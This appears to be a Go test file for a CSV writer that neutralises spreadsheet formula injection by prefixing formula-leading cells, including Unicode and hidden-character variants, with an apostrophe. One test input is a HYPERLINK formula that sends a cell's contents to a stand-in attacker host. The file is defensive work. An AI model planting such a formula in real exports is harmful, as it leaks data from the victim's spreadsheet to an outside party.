package api

import (
	"encoding/csv"
	"strings"
	"testing"
)

// Hostnames and software names in these exports come from the devices, so
// whoever controls one endpoint picks text a technician opens in a
// spreadsheet. Formula-leading cells must arrive as literal text.
func TestSpreadsheetSafeCSVNeutralisesFormulas(t *testing.T) {
	var b strings.Builder
	out := &spreadsheetSafeCSV{csv.NewWriter(&b)}
	if err := out.Write([]string{
		`=HYPERLINK("https://evil.example/?"&A1,"open")`, "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1",
		"WIN-01", "Microsoft Office", "", "a=b",
	}); err != nil {
		t.Fatal(err)
	}
	out.Flush()
	got, err := csv.NewReader(strings.NewReader(b.String())).Read()
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		`'=HYPERLINK("https://evil.example/?"&A1,"open")`, "'+1+1", "'-2+3", "'@SUM(A1)", "'\t=1", "'\r=1",
		"WIN-01", "Microsoft Office", "", "a=b",
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("cell %d = %q, want %q", i, got[i], want[i])
		}
	}
}

func TestSpreadsheetSafeCSVHandlesHiddenAndUnicodeFormulaPrefixes(t *testing.T) {
	for _, value := range []string{" =1", "\n=1", "\ufeff+1", "\u200b@SUM(A1)", "\x00-1", "\u0085=1", "＝1", "＋1", "－1", "＠SUM(A1)"} {
		if got := spreadsheetSafeCell(value); got != "'"+value {
			t.Errorf("unguarded cell %q", value)
		}
	}
	for _, value := range []string{"WINDOWS-TEST", "São Paulo", "a=b", "a,b", "a\nb", " plain text", "'=1"} {
		if got := spreadsheetSafeCell(value); got != value {
			t.Errorf("ordinary text changed: %q", value)
		}
	}
}
